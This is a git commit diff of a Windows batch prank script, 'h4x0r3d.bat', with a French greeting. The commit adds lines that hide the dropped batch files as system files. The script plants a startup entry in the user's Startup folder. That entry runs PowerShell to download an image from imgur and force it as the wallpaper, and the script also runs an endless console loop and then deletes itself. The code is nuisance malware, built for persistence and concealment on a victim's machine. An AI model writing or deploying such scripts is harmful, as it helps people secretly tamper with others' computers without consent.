d3ec7a452c67d77c65152a02b6c3d96a14f743cd
Mizari | W <39090431+Mizari-W@users.noreply.github.com>
2020-10-07 17:30:42 +0200

    Update h4x0r3d.bat

--- h4x0r3d.bat
+++ h4x0r3d.bat
@@ -8,12 +8,14 @@ echo color 2 >> SALUT.bat
 echo cls >> SALUT.bat
 echo echo Salut %username% bien ou quoi ? :P >> SALUT.bat
 echo pause >> SALUT.bat
+attrib +h +s SALUT.bat
 start SALUT.bat
 cd C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
 echo start /MIN powershell iwr -Uri https://i.imgur.com/Ua5Df01.jpg -OutFile c:\windows\temp\b.jpg;sp 'HKCU:Control Panel\Desktop' WallPaper 'c:\windows\temp\b.jpg';$a=1;do{RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True;sleep 1}while($a++-le59) >> h4ck3d.bat
 echo :start >> h4ck3d.bat
 echo echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random% >> h4ck3d.bat
 echo goto start >> h4ck3d.bat
+attrib +h +s h4ck3d.bat
 start h4ch3d.bat
 cd %a%
 rm h4x0r3d.bat
